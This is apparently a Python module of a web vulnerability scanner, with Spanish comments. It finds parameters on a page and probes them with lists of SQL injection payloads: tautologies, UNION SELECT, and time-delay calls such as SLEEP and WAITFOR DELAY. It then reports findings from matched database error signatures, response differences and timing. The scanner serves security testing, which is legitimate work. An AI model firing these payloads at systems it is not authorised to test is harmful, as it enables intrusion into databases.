import re
import statistics
from difflib import SequenceMatcher

from models.http_utils import hacer_peticion, construir_url, construir_url_params
from models.discovery import descubrir_objetivos


SQLI_PAYLOADS_ERROR = [
    "'", "''", '"', "1'", "' OR '1'='1", '" OR "1"="1', "'; --", "') OR ('1'='1",
    ")) OR (1=1)--", "1;--", "'' OR ''='", "\" OR \"\"=\"",
    "1) OR 1=1--", "' OR 1=1--", "' OR ''='", "' OR 'a'='a",
    "' UNION SELECT NULL--", "1' AND 1=1--", "1' AND 1=2--", "' AND 1=1--",
    "' AND 1=2--", "');--", "'); --", "')))--", "1)))--",
    "' or 1=1 --", "' OR 1=1#", "' OR 1=1/*",
]

SQLI_PAYLOADS_BOOLEAN_TRUE = [
    "' OR '1'='1", "1 OR 1=1", "' OR 1=1--", "' OR 'a'='a", "' OR 1=1#",
    "' OR 1=1/*", "1) OR 1=1)--", "') OR ('1'='1", "1 OR 1=1;--", "' OR TRUE--",
    "' OR 2>1--", "' OR 'x'!='x", "' OR 1!=0--", "1 OR 1!=0--",
]

SQLI_PAYLOADS_BOOLEAN_FALSE = [
    "' AND '1'='2", "1 AND 1=2", "' AND 1=2--", "' AND 'a'='b", "' AND 1=2#",
    "' AND 1=2/*", "1) AND 1=2)--", "') AND ('1'='2", "1 AND 1=2;--", "' AND FALSE--",
    "' AND 2>1--", "' AND 'x'='x", "' AND 1!=1--", "1 AND 1!=1--",
]

SQLI_PAYLOADS_TIME = [
    ("MySQL", "'; SLEEP(5) --", 5), ("MySQL", "'; BENCHMARK(5000000,MD5('test')) --", 5),
    ("PostgreSQL", "'; SELECT pg_sleep(5) --", 5), ("SQLite", "'; SELECT randomblob(50000000) --", 5),
    ("SQL Server", "'; WAITFOR DELAY '0:0:5' --", 5), ("Oracle", "'; DBMS_LOCK.SLEEP(5) --", 5),
    ("MariaDB", "'; SLEEP(5) --", 5),
]

# Firmas específicas de errores SQL. Se evitaron cadenas demasiado genéricas
# ("msg ", "sql server", "psql", "pg_", "oracle", "sqlstate", "near \"") que
# provocaban falsos positivos en páginas con contenido legítimo.
ERROR_SIGNATURES = {
    "MySQL": ["you have an error in your sql syntax", "warning: mysql", "mysql_fetch",
              "mysql_num_rows", "mysql_connect", "mysql_query", "mysql_error"],
    "PostgreSQL": ["pg_query", "syntax error at or near", "postgresql",
                   "unrecognized configuration parameter"],
    "SQL Server": ["microsoft sql server", "unclosed quotation mark",
                   "odbc sql server driver", "incorrect syntax near"],
    "Oracle": ["ora-"],
    "SQLite": ["sqlite3", "sqlite_", "unrecognized token"],
    "Generic": ["sql syntax", "database error", "sql error", "database returned",
                "unexpected end of sql command", "quoted string not properly terminated"],
}

SQLI_DB_ORDER = ["MySQL", "PostgreSQL", "SQL Server", "Oracle", "SQLite", "MariaDB", "Generic"]


def _normalizar_respuesta(texto: str) -> str:
    texto = re.sub(r"<script[^>]*>.*?</script>", " ", texto, flags=re.DOTALL | re.IGNORECASE)
    texto = re.sub(r"<style[^>]*>.*?</style>", " ", texto, flags=re.DOTALL | re.IGNORECASE)
    texto = re.sub(r"<[^>]+>", " ", texto)
    texto = re.sub(r"&nbsp;|&#160;|&#xa0;", " ", texto, flags=re.IGNORECASE)
    texto = re.sub(r"&amp;", "&", texto)
    texto = re.sub(r"&lt;", "<", texto)
    texto = re.sub(r"&gt;", ">", texto)
    texto = re.sub(r"&quot;", '"', texto)
    texto = re.sub(r"&#\d+;", " ", texto)
    texto = re.sub(r"\s+", " ", texto)
    return texto.strip().lower()


class SQLiModel:
    def __init__(self, timeout: int = 5, time_threshold: float = 2.0,
                 time_runs: int = 3, max_objetivos: int = 12):
        self.timeout = timeout
        self.time_threshold = time_threshold
        self.time_runs = time_runs
        self.max_objetivos = max_objetivos

    # ------------------------------------------------------------------ envío
    def _enviar(self, objetivo: dict, valor: str, timeout: int | None = None):
        """Inyecta `valor` en el parámetro del objetivo (GET o POST)."""
        t = timeout or self.timeout
        if objetivo["method"] == "POST":
            datos = dict(objetivo.get("params", {}))
            datos[objetivo["param"]] = valor
            return hacer_peticion(objetivo["url"], timeout=t, method="POST", data=datos)
        url = construir_url_params(objetivo["url"], objetivo.get("params", {}))
        url = construir_url(url, objetivo["param"], valor)
        return hacer_peticion(url, timeout=t)

    # --------------------------------------------------------------- análisis
    def analizar(self, url: str, callback=None) -> dict:
        if callback:
            callback(0.02, "Descubriendo parámetros en la página...")

        objetivos, info = descubrir_objetivos(url)

        if not objetivos:
            return {
                "url": url, "vulnerable": False, "parametros_probados": [],
                "hallazgos": [], "objetivos": [], "descubrimiento": info,
                "detalle": info.get("mensaje") or "No se encontraron parámetros ni formularios que analizar.",
            }

        truncado = len(objetivos) > self.max_objetivos
        if truncado:
            objetivos = objetivos[:self.max_objetivos]

        parametros_probados = [f"{o['param']} ({o['method']})" for o in objetivos]
        n = len(objetivos)
        hallazgos = []

        for i, objetivo in enumerate(objetivos):
            base_progress = 0.05 + (i / n) * 0.9
            step = 0.9 / (n * 3)
            etiqueta = f"[{objetivo['param']} · {objetivo['method']}]"

            if callback:
                callback(base_progress, f"{etiqueta} Error-based (1/3)...")
            hallazgos.extend(self._error_based(
                objetivo,
                sub_callback=lambda p, m: callback(base_progress + p * step, m) if callback else None,
            ))

            if callback:
                callback(base_progress + step, f"{etiqueta} Boolean-based (2/3)...")
            hallazgos.extend(self._boolean_based(
                objetivo,
                sub_callback=lambda p, m: callback(base_progress + step + p * step, m) if callback else None,
            ))

            if callback:
                callback(base_progress + 2 * step, f"{etiqueta} Time-based (3/3)...")
            hallazgos.extend(self._time_based(
                objetivo,
                sub_callback=lambda p, m: callback(base_progress + 2 * step + p * step, m) if callback else None,
            ))

        if callback:
            callback(1.0, "Análisis completo")

        vulnerable = len(hallazgos) > 0
        fuentes = []
        if info.get("formularios"):
            fuentes.append(f"{info['formularios']} formulario(s)")
        if info.get("enlaces_con_params"):
            fuentes.append(f"{info['enlaces_con_params']} enlace(s) con parámetros")
        if any(o["origen"] == "url" for o in objetivos):
            fuentes.append("parámetros de la URL")
        resumen = ", ".join(fuentes) if fuentes else "puntos detectados"

        if vulnerable:
            detalle = (f"Se analizaron {n} punto(s) de inyección ({resumen}) y se "
                       f"detectaron {len(hallazgos)} hallazgo(s).")
        else:
            detalle = (f"No se detectaron signos claros de inyección SQL en {n} punto(s) "
                       f"de inyección ({resumen}).")
        if truncado:
            detalle += f" Se limitó el análisis a {self.max_objetivos} parámetros."

        return {
            "url": url, "vulnerable": vulnerable, "parametros_probados": parametros_probados,
            "hallazgos": hallazgos, "objetivos": objetivos,
            "descubrimiento": info, "detalle": detalle,
        }

    # ------------------------------------------------------------- técnicas
    def _firmas_error(self, body: str, headers_str: str) -> dict:
        """Firmas de error SQL presentes, con detalle de dónde aparecen."""
        encontradas = {}
        for db in SQLI_DB_ORDER:
            for firma in ERROR_SIGNATURES.get(db, []):
                firma_lower = firma.lower()
                en_body = firma_lower in body
                en_headers = firma_lower in headers_str
                if en_body or en_headers:
                    encontradas[(db, firma_lower)] = {
                        "db": db, "firma": firma,
                        "en_body": en_body, "en_headers": en_headers,
                    }
        return encontradas

    def _error_based(self, objetivo: dict, sub_callback=None) -> list:
        total = len(SQLI_PAYLOADS_ERROR)

        # Línea base: firmas que ya aparecen sin inyectar. Se restan para no
        # reportar como vulnerabilidad texto SQL legítimo de la página.
        resp_base, _, err_base = self._enviar(objetivo, objetivo.get("valor_base", ""))
        firmas_base = set()
        if resp_base is not None and not err_base:
            firmas_base = set(
                self._firmas_error(resp_base.text.lower(), str(resp_base.headers).lower())
            )

        firmas_encontradas = {}
        payload_principal = SQLI_PAYLOADS_ERROR[0]
        mejor_status = None

        for i, payload in enumerate(SQLI_PAYLOADS_ERROR):
            if sub_callback:
                sub_callback(i / total, f"  Probando payload {i+1}/{total}: {payload[:30]}...")

            response, _, error = self._enviar(objetivo, payload)

            if error or response is None:
                if mejor_status is None:
                    mejor_status = response.status_code if response is not None else 0
                continue

            if mejor_status is None:
                mejor_status = response.status_code

            nuevas = {
                clave: data
                for clave, data in self._firmas_error(
                    response.text.lower(), str(response.headers).lower()
                ).items()
                if clave not in firmas_base
            }
            if nuevas:
                payload_principal = payload
                firmas_encontradas.update(nuevas)

        if sub_callback:
            sub_callback(1.0, "  Error-based completado")

        if not firmas_encontradas:
            return []

        firmas_lista = list(firmas_encontradas.values())
        confidence = self._calcular_confianza_error(firmas_lista, mejor_status)

        dbs_detectadas = {f["db"] for f in firmas_lista}
        dbs_distintas = [db for db in SQLI_DB_ORDER if db in dbs_detectadas]
        if len(dbs_distintas) > 1:
            dbs_distintas = [d for d in dbs_distintas if d != "Generic"] or dbs_distintas
        firmas_texto = "; ".join(f"{f['firma']}" for f in firmas_lista[:5])
        ambito = []
        for f in firmas_lista[:3]:
            partes = [lugar for lugar, ok in (("cuerpo", f["en_body"]), ("headers", f["en_headers"])) if ok]
            ambito.append(f"{f['db']} ({'+'.join(partes)})")

        hallazgo = {
            "tipo": "error-based", "parametro": objetivo["param"],
            "metodo": objetivo["method"], "url_objetivo": objetivo["url"],
            "origen": objetivo.get("origen", ""),
            "payload": payload_principal, "severidad": "Alta", "confianza": confidence,
            "motor_sugerido": ", ".join(dbs_distintas),
            "firmas_detectadas": len(firmas_encontradas), "motivos": firmas_texto,
            "evidencia": f"Firmas SQL en {', '.join(ambito)}: {firmas_texto}",
            "codigo_http": mejor_status,
        }
        hallazgo["cvss"] = 0
        hallazgo["nivel_riesgo"] = ""
        hallazgo["explicacion"] = ""
        return [hallazgo]

    def _boolean_based(self, objetivo: dict, sub_callback=None) -> list:
        response_base, _, error_base = self._enviar(objetivo, "")

        if error_base or response_base is None:
            if sub_callback:
                sub_callback(1.0, "  Sin respuesta base válida")
            return []

        contenido_base = response_base.text
        tamano_base = len(contenido_base)
        status_base = response_base.status_code
        base_normalizada = _normalizar_respuesta(contenido_base)
        tamano_normalizado = len(base_normalizada)

        if tamano_base < 50:
            if sub_callback:
                sub_callback(1.0, "  Respuesta base demasiado pequeña para boolean-based")
            return []

        indicadores = {"status": 0, "tamano": 0, "similitud": 0}
        detalles = {}
        max_diff_pct = 0.0

        for payload_true in SQLI_PAYLOADS_BOOLEAN_TRUE:
            for payload_false in SQLI_PAYLOADS_BOOLEAN_FALSE:
                response_true, _, error_true = self._enviar(objetivo, payload_true)
                response_false, _, error_false = self._enviar(objetivo, payload_false)

                if error_true or error_false or response_true is None or response_false is None:
                    continue

                contenido_true = response_true.text
                contenido_false = response_false.text
                norm_true = _normalizar_respuesta(contenido_true)
                norm_false = _normalizar_respuesta(contenido_false)

                similitud_true = SequenceMatcher(None, base_normalizada, norm_true).ratio()
                similitud_false = SequenceMatcher(None, base_normalizada, norm_false).ratio()

                diff_pct = 0.0
                if tamano_normalizado > 0:
                    diff_pct = abs(len(norm_true) - len(norm_false)) / tamano_normalizado * 100

                max_diff_pct = max(max_diff_pct, diff_pct)

                if response_true.status_code != status_base:
                    indicadores["status"] = max(indicadores["status"], 1)
                    detalles["status"] = f"status {status_base} → {response_true.status_code} (true) / {response_false.status_code} (false)"

                if response_false.status_code != status_base:
                    indicadores["status"] = max(indicadores["status"], 1)
                    detalles["status"] = f"status {status_base} → {response_true.status_code} (true) / {response_false.status_code} (false)"

                if diff_pct > 10:
                    indicadores["tamano"] = max(indicadores["tamano"], 2)
                    detalles["tamano"] = f"diferencia {round(diff_pct, 2)}%"
                elif diff_pct > 5:
                    indicadores["tamano"] = max(indicadores["tamano"], 1)
                    detalles["tamano"] = f"diferencia {round(diff_pct, 2)}%"

                if similitud_false < 0.85:
                    indicadores["similitud"] = max(indicadores["similitud"], 2)
                    detalles["similitud"] = f"similitud false {round(similitud_false, 4)} vs base"
                elif similitud_false < 0.93:
                    indicadores["similitud"] = max(indicadores["similitud"], 1)
                    detalles["similitud"] = f"similitud false {round(similitud_false, 4)} vs base"

                if similitud_true < 0.85:
                    indicadores["similitud"] = max(indicadores["similitud"], 2)
                    detalles["similitud_true"] = f"similitud true {round(similitud_true, 4)} vs base"

                if indicadores["status"] >= 1 and indicadores["tamano"] >= 1 and indicadores["similitud"] >= 1:
                    break
            if indicadores["status"] >= 1 and indicadores["tamano"] >= 1 and indicadores["similitud"] >= 1:
                break

        if sub_callback:
            sub_callback(1.0, "  Boolean-based completado")

        puntos = sum(indicadores.values())
        if puntos < 3:
            return []

        confidence = min(100, round(puntos * 20 + max_diff_pct * 0.5, 1))
        if confidence < 50:
            confidence = min(100, round(puntos * 25, 1))

        if puntos < 4:
            severidad = "Media"
        elif puntos < 6:
            severidad = "Alta"
        else:
            severidad = "Crítica"

        hallazgo = {
            "tipo": "boolean-based blind", "parametro": objetivo["param"],
            "metodo": objetivo["method"], "url_objetivo": objetivo["url"],
            "origen": objetivo.get("origen", ""),
            "payload": "true/false payloads comparados",
            "severidad": severidad, "confianza": confidence, "indicadores": dict(indicadores),
            "detalles": detalles, "diferencia_tamano_pct_max": round(max_diff_pct, 2),
            "codigo_http_base": status_base,
        }
        hallazgo["cvss"] = 0
        hallazgo["nivel_riesgo"] = ""
        hallazgo["explicacion"] = ""
        return [hallazgo]

    def _time_based(self, objetivo: dict, sub_callback=None) -> list:
        tiempos_base = []
        for _ in range(self.time_runs):
            _, tiempo_base, error_base = self._enviar(objetivo, "", timeout=self.timeout)
            if error_base:
                if sub_callback:
                    sub_callback(1.0, "  Sin respuesta base válida")
                return []
            tiempos_base.append(tiempo_base)

        tiempo_base_mediana = statistics.median(tiempos_base)
        tiempo_base_desviacion = statistics.stdev(tiempos_base) if len(tiempos_base) > 1 else 0
        umbral_stat = tiempo_base_mediana + max(tiempo_base_desviacion * 3, self.time_threshold)

        total = len(SQLI_PAYLOADS_TIME)
        for i, (motor, payload, delay) in enumerate(SQLI_PAYLOADS_TIME):
            if sub_callback:
                sub_callback(i / total, f"  Probando {motor} (delay {delay}s)...")

            tiempos_respuesta = []
            tiempos_exito = 0
            for _ in range(self.time_runs):
                _, tiempo_respuesta, error = self._enviar(
                    objetivo, payload, timeout=max(self.timeout, delay + self.timeout)
                )
                if error:
                    continue
                tiempos_respuesta.append(tiempo_respuesta)
                if tiempo_respuesta >= (tiempo_base_mediana + delay * 0.6):
                    tiempos_exito += 1

            if not tiempos_respuesta:
                continue

            tiempo_mediana = statistics.median(tiempos_respuesta)
            diferencia = tiempo_mediana - tiempo_base_mediana
            ratio = tiempo_mediana / tiempo_base_mediana if tiempo_base_mediana > 0 else 0

            if diferencia >= self.time_threshold and tiempo_mediana >= umbral_stat:
                consistencia = tiempos_exito / self.time_runs
                confidence = min(100, round(40 + consistencia * 50 + (diferencia / delay) * 5, 1))
                if confidence < 50:
                    confidence = min(100, round(30 + consistencia * 50 + (diferencia / delay) * 10, 1))

                if sub_callback:
                    sub_callback(1.0, f"  Time-based: hallazgo en {motor}")
                hallazgo = {
                    "tipo": "time-based blind", "parametro": objetivo["param"],
                    "metodo": objetivo["method"], "url_objetivo": objetivo["url"],
                    "origen": objetivo.get("origen", ""),
                    "payload": payload, "severidad": "Alta", "confianza": confidence,
                    "motor_sugerido": motor,
                    "tiempo_base_mediana": round(tiempo_base_mediana, 3),
                    "tiempo_base_desviacion": round(tiempo_base_desviacion, 3),
                    "tiempo_respuesta_mediana": round(tiempo_mediana, 3),
                    "diferencia": round(diferencia, 3), "ratio": round(ratio, 3),
                    "delay_esperado": delay, "consistencia": round(consistencia, 2),
                    "tiempos_por_run": [round(t, 3) for t in tiempos_respuesta],
                    "tiempos_base": [round(t, 3) for t in tiempos_base],
                }
                hallazgo["cvss"] = 0
                hallazgo["nivel_riesgo"] = ""
                hallazgo["explicacion"] = ""
                return [hallazgo]

        if sub_callback:
            sub_callback(1.0, "  Time-based completado")
        return []

    def _calcular_confianza_error(self, firmas: list, status_code: int) -> int:
        dbs = len({f["db"] for f in firmas})
        firma_count = len(firmas)
        base = min(firma_count * 15, 60)
        db_bonus = min(dbs * 10, 20)
        if status_code and status_code >= 500:
            base += 15
        elif status_code and status_code >= 400:
            base += 5
        return min(100, base + db_bonus)
